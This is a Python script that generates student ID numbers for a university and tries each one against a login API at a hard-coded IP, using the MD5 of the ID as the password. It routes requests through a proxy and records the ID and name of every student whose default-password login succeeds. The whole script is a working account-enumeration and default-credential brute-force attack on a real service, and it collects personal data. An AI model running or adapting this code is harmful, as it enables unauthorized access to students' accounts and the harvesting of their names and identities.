# ~/annaconda3/bin/python3.6
# -*- coding:utf-8 -*-
'''
__author__ = 'XD'
__mtime__ = 18-7-27
__IDE__ = PyCharm
Fix the Problem, Not the Blame.
'''
import hashlib
import requests
import json


def get_token_text(student_num):
    '''
    获取动态的token
    :param student_num: 学号
    :return: str
    '''
    # mod5加密, 传入头
    proxy = {'http': 'http://219.141.153.3'}
    p_text = hashlib.md5(student_num.encode('utf-8')).hexdigest()
    header = {'Content-Type': 'application/json; charset=utf-8',
              'User-Agent': 'okhttp/3.3.1'
              }
    data = {
        "u": student_num,
        "p": p_text
    }
    url = 'http://42.244.42.160/university-facade/Murp/Login'
    # 访问
    response = requests.post(url, data=json.dumps(data), headers=header, proxies=proxy)
    return json.loads(response.text)


def main():
    # 获取学院代码
    with open('./data/major.json', encoding='utf-8') as f:
        major_nums = json.loads(f.readline())
    # 构建学号
    for major_num in major_nums:
        for i in range(0, 10):
            # 第四位只有4或5
            for j in range(0, 10):
                # 第五位只有0或1
                for k in range(0, 10):
                    # 第六位都有可能
                    for l in range(1, 4):
                        # 可能出现改密码情况， 重复尝试3次。
                        student_number = '17{}{}{}{}00{}'.format(major_num[0], i, j, k, l)
                        logging = get_token_text(student_number)
                        logging_state = logging['state']
                        if logging_state == 200:
                            with open('./data/is_students_again.txt', 'a') as f:
                                name = logging['data']['name']
                                num = logging['data']['xh']
                                f.write(num + ' ' + name + ' ' + major_num[1] + '\n')
                                print('====================================', num + ' ' + name + ' ' + major_num[1])
                                break
                        else:
                            with open('./data/not_students.txt', 'a') as f:
                                f.write(student_number + ' ' + str(logging) + '\n')
                                print(student_number, logging)


if __name__ == '__main__':
    main()
